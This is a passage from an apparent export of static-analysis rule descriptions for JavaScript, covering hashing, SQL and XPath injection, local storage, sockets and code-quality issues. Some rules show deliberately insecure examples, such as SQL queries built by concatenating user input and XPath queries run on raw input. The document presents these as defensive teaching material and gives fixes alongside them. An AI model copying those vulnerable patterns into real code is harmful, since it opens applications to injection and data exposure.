</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A9 - Using Components with Known Vulnerabilities </li>
</ul>",Web SQL databases should not be used,[],BLOCKER,"['html5', 'owasp-a3', 'owasp-a9']",VULNERABILITY
2019-03-04T09:37:21+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Server side ===
const crypto = require(""crypto"");

const hash = crypto.createHash('sha1'); // Questionable regardless of algorithm used

crypto.scrypt(secret, salt, keylen, (err, derivedKey) =&gt; {}); // Questionable
const derivedKey = crypto.scryptSync(secret, salt, keylen); // Questionable
</pre>
<pre>
// === Client side ===
crypto.subtle.digest(""SHA-256"", buffer) // Questionable regardless of algorithm used
  .then(function (hash) {});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4790,js,JavaScript,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Server side ===
const crypto = require(""crypto"");

const hash = crypto.createHash('sha1'); // Questionable regardless of algorithm used

crypto.scrypt(secret, salt, keylen, (err, derivedKey) =&gt; {}); // Questionable
const derivedKey = crypto.scryptSync(secret, salt, keylen); // Questionable
</pre>
<pre>
// === Client side ===
crypto.subtle.digest(""SHA-256"", buffer) // Questionable regardless of algorithm used
  .then(function (hash) {});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2015-07-09T16:59:47+0200,"<p>You can easily call a JavaScript function with more arguments than the function needs, but the extra arguments will be just ignored by function
execution.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function say(a, b) {
  print(a + "" "" + b);
}

say(""hello"", ""world"", ""!""); // Noncompliant; last argument is not used
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when <code>arguments</code> is used in the body of the function being called.</p>
<pre>
function doSomething(a, b) {
  compute(arguments);
}

doSomething(1, 2, 3) // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.6 - The number of arguments passed to a function shall match the number of parameters. </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/628.html"">MITRE, CWE-628</a> - Function Call with Incorrectly Specified Arguments </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/LoAg"">CERT, DCL07-C.</a> - Include the appropriate type information in function
  declarators </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VQBc"">CERT, EXP37-C.</a> - Call functions with the correct number and type of arguments
  </li>
</ul>",javascript:S930,js,JavaScript,"<p>You can easily call a JavaScript function with more arguments than the function needs, but the extra arguments will be just ignored by function
execution.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function say(a, b) {
  print(a + "" "" + b);
}

say(""hello"", ""world"", ""!""); // Noncompliant; last argument is not used
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when <code>arguments</code> is used in the body of the function being called.</p>
<pre>
function doSomething(a, b) {
  compute(arguments);
}

doSomething(1, 2, 3) // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.6 - The number of arguments passed to a function shall match the number of parameters. </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/628.html"">MITRE, CWE-628</a> - Function Call with Incorrectly Specified Arguments </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/LoAg"">CERT, DCL07-C.</a> - Include the appropriate type information in function
  declarators </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VQBc"">CERT, EXP37-C.</a> - Call functions with the correct number and type of arguments
  </li>
</ul>",Function calls should not pass extra arguments,[],CRITICAL,"['cert', 'cwe', 'misra']",BUG
2015-10-02T13:39:50+0200,"<p>Any statement (other than a null statement, which means a statement containing only a semicolon <code>;</code>) which has no side effect and does
not result in a change of control flow will normally indicate a programming error, and therefore should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a == 1; // Noncompliant; was assignment intended?
var msg = ""Hello, ""
  ""World!""; // Noncompliant; have we forgotten '+' operator on previous line?
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/482"">MITRE, CWE-482</a> - Comparing instead of Assigning </li>
  <li> MISRA C:2004, 14.2 - All non-null statements shall either have at least one side-effect however executed, or cause control flow to change.
  </li>
</ul>",javascript:S905,js,JavaScript,"<p>Any statement (other than a null statement, which means a statement containing only a semicolon <code>;</code>) which has no side effect and does
not result in a change of control flow will normally indicate a programming error, and therefore should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a == 1; // Noncompliant; was assignment intended?
var msg = ""Hello, ""
  ""World!""; // Noncompliant; have we forgotten '+' operator on previous line?
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/482"">MITRE, CWE-482</a> - Comparing instead of Assigning </li>
  <li> MISRA C:2004, 14.2 - All non-null statements shall either have at least one side-effect however executed, or cause control flow to change.
  </li>
</ul>",Non-empty statements should change control flow or have at least one side-effect,[],MAJOR,"['cwe', 'misra', 'unused']",BUG
2015-10-02T13:39:50+0200,"<p>Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb
cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because
the data is not encrypted by default and any script on the page may access it.</p>
<p>This rule raises an issue when the <code>localStorage</code> and <code>sessionStorage</code> API's are used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
localStorage.setItem(""login"", login); // Noncompliant
sessionStorage.setItem(""sessionId"", sessionId); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf"">Packet Storm Security</a> - HTML 5 Modern
  Day Attack And Defence Vectors </li>
</ul>",javascript:S3271,js,JavaScript,"<p>Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb
cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because
the data is not encrypted by default and any script on the page may access it.</p>
<p>This rule raises an issue when the <code>localStorage</code> and <code>sessionStorage</code> API's are used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
localStorage.setItem(""login"", login); // Noncompliant
sessionStorage.setItem(""sessionId"", sessionId); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf"">Packet Storm Security</a> - HTML 5 Modern
  Day Attack And Defence Vectors </li>
</ul>",Local storage should not be used,[],CRITICAL,['owasp-a3'],VULNERABILITY
2019-03-04T09:37:21+0100,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule flags the execution of SQL queries which might be susceptible to SQL injection. The goal is to guide security code reviews.</p>
<p>This rule raises an issue when any of the following NodeJS APIs is used: </p>
<ul>
  <li> <code>mysql.query()</code> </li>
  <li> <code>mysql2.query()</code> </li>
  <li> <code>pg.query()</code> </li>
  <li> <code>sequelize.query()</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> An ORM framework should be preferred to native database functions as it supports prepared statements and bind parameters. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const sql = 'SELECT * FROM users WHERE id = ' + userinput;

// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(sql, (err, res) =&gt; {}); // Noncompliant
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(sql, (err, res) =&gt; {}); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
// === MySQL ===
const sql = 'SELECT name FROM users WHERE id = ?';
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(sql, [userinput], (err, res) =&gt; {});
});

// === PostgreSQL ===
const sql = 'SELECT name FROM users WHERE id = $1';
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(sql, [userinput], (err, res) =&gt; {});
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the database command is defined by a hard-coded string (no concatenation).</p>
<pre>
pgcon.query('SELECT name FROM users WHERE id = 42', (err, res) =&gt; {});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",javascript:S2077,js,JavaScript,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule flags the execution of SQL queries which might be susceptible to SQL injection. The goal is to guide security code reviews.</p>
<p>This rule raises an issue when any of the following NodeJS APIs is used: </p>
<ul>
  <li> <code>mysql.query()</code> </li>
  <li> <code>mysql2.query()</code> </li>
  <li> <code>pg.query()</code> </li>
  <li> <code>sequelize.query()</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> An ORM framework should be preferred to native database functions as it supports prepared statements and bind parameters. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const sql = 'SELECT * FROM users WHERE id = ' + userinput;

// === MySQL ===
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(sql, (err, res) =&gt; {}); // Noncompliant
});

// === PostgreSQL ===
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(sql, (err, res) =&gt; {}); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
// === MySQL ===
const sql = 'SELECT name FROM users WHERE id = ?';
const mysql = require('mysql');
const mycon = mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(sql, [userinput], (err, res) =&gt; {});
});

// === PostgreSQL ===
const sql = 'SELECT name FROM users WHERE id = $1';
const pg = require('pg');
const pgcon = new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(sql, [userinput], (err, res) =&gt; {});
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if the database command is defined by a hard-coded string (no concatenation).</p>
<pre>
pgcon.query('SELECT name FROM users WHERE id = 42', (err, res) =&gt; {});
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2019-03-04T09:37:21+0100,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
// === Server side ===

var xpath = require('xpath');
var xmldom = require('xmldom');

var doc = new xmldom.DOMParser().parseFromString(xml);
var nodes = xpath.select(userinput, doc); // Questionable
var node = xpath.select1(userinput, doc); // Questionable
</pre>
<pre>
// === Client side ===

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Questionable

// Internet Explorer uses its own methods to select nodes:
var nodes = xmlDoc.selectNodes(userinput); // Questionable
var node = xmlDoc.SelectSingleNode(userinput); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",javascript:S4817,js,JavaScript,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
// === Server side ===

var xpath = require('xpath');
var xmldom = require('xmldom');

var doc = new xmldom.DOMParser().parseFromString(xml);
var nodes = xpath.select(userinput, doc); // Questionable
var node = xpath.select1(userinput, doc); // Questionable
</pre>
<pre>
// === Client side ===

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Questionable

// Internet Explorer uses its own methods to select nodes:
var nodes = xmlDoc.selectNodes(userinput); // Questionable
var node = xmlDoc.SelectSingleNode(userinput); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",Executing XPath expressions is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2019-03-04T09:37:21+0100,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
const net = require('net');

var socket = new net.Socket(); // Questionable
socket.connect(80, 'google.com');

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () =&gt; {}); // Questionable

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () =&gt; {}); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4818,js,JavaScript,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
